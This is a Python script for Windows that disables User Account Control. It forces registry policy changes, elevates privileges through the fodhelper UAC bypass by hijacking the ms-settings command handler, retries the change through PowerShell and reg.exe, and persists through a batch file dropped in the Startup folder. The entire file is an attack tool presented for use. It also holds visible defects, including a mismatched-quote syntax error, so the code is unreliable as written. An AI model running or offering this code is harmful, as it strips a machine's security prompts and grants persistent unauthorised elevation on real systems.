import winreg
import subprocess
import os
import time
import logging
import sys

# Set up aggressive logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s', filename='uac_aggressive_disabler.log')

def attempt_registry_write(key_path, value_name, value_data, value_type, retries=3):
    """Aggressively attempt registry writes with retries"""
    for attempt in range(retries):
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, value_name, 0, value_type, value_data)
            winreg.CloseKey(key)
            logging.debug(f"Registry write successful for {value_name} on attempt {attempt + 1}")
            return True
        except Exception as e:
            logging.warning(f"Registry write failed for {value_name} (attempt {attempt + 1}/{retries}): {str(e)}")
            time.sleep(1)
    return False

def attempt_uac_bypass_exploit(method="fodhelper"):
    """Attempt a UAC bypass to gain elevation before disabling"""
    try:
        if method == "fodhelper":
            payload = r"powershell.exe -ep bypass -noprofile -Command \"Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'EnableLUA' -Value 0\""
            reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            subprocess.run("fodhelper.exe", shell=True)
            time.sleep(2)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(key, "")
            winreg.DeleteValue(key, "DelegateExecute")
            winreg.CloseKey(key)
            logging.info("Fodhelper bypass attempted")
            return True
    except Exception as e:
        logging.error(f"UAC bypass via {method} failed: {str(e)}")
        return False

def disable_uac_aggressive():
    """Aggressive UAC disable with exploit attempts and retries"""
    logging.info("Starting aggressive UAC disable process...")
    success = False
    
    # Step 1: Attempt Direct Registry Modifications with Retries
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    reg_changes = [
        ("EnableLUA", 0, winreg.REG_DWORD),
        ("ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD),
        ("PromptOnSecureDesktop", 0, winreg.REG_DWORD),
        ("LocalAccountTokenFilterPolicy", 1, winreg.REG_DWORD)
    ]
    
    for value_name, value_data, value_type in reg_changes:
        if attempt_registry_write(reg_path, value_name, value_data, value_type):
            success = True
    
    # Step 2: If Direct Registry Fails, Attempt UAC Bypass Exploits
    if not success:
        logging.info("Direct registry failed, attempting UAC bypass exploits...")
        if attempt_uac_bypass_exploit("fodhelper"):
            # Re-attempt registry writes post-exploit
            for value_name, value_data, value_type in reg_changes:
                if attempt_registry_write(reg_path, value_name, value_data, value_type):
                    success = True
    
    # Step 3: Brute Force with Alternative Tools (PowerShell and CMD)
    if not success:
        logging.info("Falling back to PowerShell and CMD brute force...')
        tools = [
            ("powershell.exe", [
                r"Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0",
                r"Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0"
            ]),
            ("cmd.exe", [
                r'reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f',
                r'reg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f'
            ])
        ]
        
        for tool, commands in tools:
            for cmd in commands:
                try:
                    if tool == "powershell.exe":
                        subprocess.run([tool, "-ExecutionPolicy", "Bypass", "-Command", cmd], shell=True)
                    else:
                        subprocess.run(f"{tool} /c {cmd}", shell=True)
                    success = True
                    logging.debug(f"Command via {tool} executed: {cmd}")
                except Exception as e:
                    logging.error(f"Command via {tool} failed: {str(e)}")
    
    # Step 4: Final Status and Persistence via Startup Script
    if success:
        try:
            startup_path = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup\uac_disabler.bat")
            with open(startup_path, 'w') as f:
                f.write(r'@echo off\nreg ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f')
            logging.info("Persistence added via startup script")
        except Exception as e:
            logging.error(f"Failed to add startup persistence: {str(e)}")
        
        print("[+] UAC disabled using aggressive multi-method approach. Check uac_aggressive_disabler.log for details.")
        print("[*] Restart system for full effect if necessary.")
    else:
        print("[-] Failed to disable UAC after all attempts. Check uac_aggressive_disabler.log for details.")

if __name__ == "__main__":
    print("[*] Starting aggressive UAC disable process with exploits and retries...")
    disable_uac_aggressive()